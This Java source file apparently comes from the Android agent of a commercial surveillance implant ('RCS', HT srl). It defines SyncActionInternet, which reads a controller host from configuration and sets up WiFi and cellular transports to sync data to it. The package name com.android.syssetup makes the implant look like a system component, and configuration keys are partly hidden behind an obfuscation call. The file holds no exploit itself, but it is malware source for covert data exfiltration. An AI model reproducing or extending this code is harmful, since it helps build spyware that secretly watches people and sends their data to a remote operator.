/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : SyncActionInternet.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.syssetup.action;

import com.android.mm.M;
import com.android.syssetup.action.sync.GprsTransport;
import com.android.syssetup.action.sync.WifiTransport;
import com.android.syssetup.auto.Cfg;
import com.android.syssetup.conf.ConfAction;
import com.android.syssetup.conf.ConfigurationException;
import com.android.syssetup.util.Check;
import com.android.syssetup.util.StringUtils;

/**
 * The Class SyncActionInternet.
 */
public class SyncActionInternet extends SyncAction {

	private static final String TAG = "SyncActionInternet"; //$NON-NLS-1$

	/**
	 * The wifi forced.
	 */
	protected boolean wifiForced;

	/**
	 * The wifi.
	 */
	protected boolean wifi;

	/**
	 * The gprs.
	 */
	protected boolean gprs;

	/**
	 * The host.
	 */
	String host;

	/**
	 * Instantiates a new sync action internet.
	 *
	 * @param params the conf params
	 */
	public SyncActionInternet(final ConfAction params) {
		super(params);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.SyncAction#parse(byte[])
	 */
	@Override
	protected boolean parse(final ConfAction params) {
		try {
			host = StringUtils.unspace(params.getString("host"));
		} catch (final ConfigurationException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: params FAILED, host is missing"); //$NON-NLS-1$
			}

			return false;
		}

		try {
			gprs = params.getBoolean(M.e("cell"));
			wifi = params.getBoolean(M.e("wifi"));
			wifiForced = wifi;


		} catch (final ConfigurationException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: params using default values"); //$NON-NLS-1$
			}

			gprs = false;
			wifi = true;
			wifiForced = wifi;
		}

		if (Cfg.DEBUG) {
			final StringBuffer sb = new StringBuffer();
			sb.append("gprs: " + gprs); //$NON-NLS-1$
			sb.append(" wifi: " + wifi); //$NON-NLS-1$
			sb.append(" stop: " + considerStop()); //$NON-NLS-1$
			sb.append(" host: " + host); //$NON-NLS-1$
			Check.log(TAG + sb.toString());//$NON-NLS-1$
		}

		return true;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.SyncAction#initTransport()
	 */
	@Override
	protected boolean initTransport() {
		transports.clear();

		if (Cfg.DEBUG) {
			Check.log(TAG + " initTransport adding WifiTransport"); //$NON-NLS-1$
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (initTransport): wifiForced: " + wifiForced); //$NON-NLS-1$
		}

		transports.addElement(new WifiTransport(host, wifiForced));

		if (gprs) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " initTransport adding DirectTransport"); //$NON-NLS-1$
			}

			transports.addElement(new GprsTransport(host));
		}

		return true;
	}

}
